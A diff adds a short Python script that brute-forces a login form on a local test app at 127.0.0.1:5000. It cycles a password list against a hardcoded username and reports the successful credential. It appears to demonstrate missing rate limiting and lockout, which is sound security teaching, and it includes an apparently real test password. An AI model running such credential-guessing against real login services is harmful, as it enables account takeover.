@@ -1,0 +1,56 @@
+import requests
+import time
+
+# Target URL
+url = "http://127.0.0.1:5000/login"  
+
+# Usernames from the database
+usernames = ["Holmes", "Louis", "Colin", "Cameron", "Chadwick",
+    "Fritz", "Troy", "Scott", "Gage", "Wylie"]
+
+# Some wrong passwords and one correct one at the end
+passwords = ["wrongpass1", "incorrect123", "letmein", "password123", "qwerty",
+    "admin123", "welcome1", "12345678", "MEC15DBF3XD"]
+
+def brute_force_attack():
+    for username in usernames[:1]:  
+        for i, password in enumerate(passwords):
+            # Prepare the form data
+            data = {"username": username,
+                "password": password}
+            
+            try:
+                # Send POST request to login
+                start_time = time.time()
+                response = requests.post(url, data=data, allow_redirects=False)
+                elapsed = time.time() - start_time
+                
+                # Check if login was successful
+                if response.status_code == 302:
+                    print(f"\n[+] Success! Credentials found: {username}:{password}")
+                    print(f"    Response code: {response.status_code}")
+                    print(f"    Time taken: {elapsed:.2f} seconds")
+                    break
+
+                # Handles failed login attempts
+                else:
+                    status = "Failed"
+                    if i == len(passwords) - 1:
+                        status = "Last attempt"
+                    print(f"[{status}] Attempt {i+1}: {username}:{password} (Code: {response.status_code}, Time: {elapsed:.2f}s)")
+
+            # Handles any errors that might be encountered                            
+            except Exception as e:
+                print(f"[!] Error: {e}")
+                break
+
+if __name__ == "__main__":
+    print("Starting brute force attack demonstration")
+    print("This shows how the login is vulnerable to brute force attacks:")
+    print("1. No rate limiting")
+    print("2. No account lockout")
+    print("3. No delay between attempts")
+    print("=" * 70)
+    print("Attempting logins (last attempt uses correct password):")
+    print("-" * 70)
+    brute_force_attack()
